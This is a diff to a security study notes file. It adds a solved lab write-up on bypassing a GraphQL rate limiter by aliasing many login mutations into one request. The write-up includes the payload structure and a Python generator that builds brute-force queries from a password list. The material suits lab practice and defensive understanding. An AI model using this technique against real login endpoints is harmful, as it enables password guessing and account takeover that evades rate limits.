@@ -139,3 +139,38 @@
 - GraphQL introspection should be disabled in production
 - Password fields should NEVER be in GraphQL types
 - getUser(id) queries need access control
+
+## Verified Lab Solution: GraphQL Alias Brute Force
+
+**Lab #55** - SOLVED 2026-07-07
+
+### Technique: Query Aliasing for Rate Limit Bypass
+
+Rate limiter counts HTTP requests, not GraphQL operations. Use aliases to send unlimited operations in single request.
+
+### Payload Structure
+```graphql
+mutation {
+  a0: login(input: {username: "carlos", password: "123456"}) { token }
+  a1: login(input: {username: "carlos", password: "password"}) { token }
+  a2: login(input: {username: "carlos", password: "admin"}) { token }
+  ...
+  a118: login(input: {username: "carlos", password: "qwerty"}) { token }
+}
+```
+
+### Python Generator
+```python
+passwords = ["123456", "password", "admin", ...]
+aliases = []
+for i, pw in enumerate(passwords):
+    aliases.append(f'a{i}: login(input: {{username: "carlos", password: "{pw}"}}) {{ token }}')
+
+query = "mutation { " + " ".join(aliases) + " }"
+```
+
+### Key Lessons
+- GraphQL aliases = multiple operations in one HTTP request
+- Rate limiters that count HTTP requests are bypassed
+- Can send 100+ login attempts in a single request
+- The server returns results for all aliases, find the one with a token
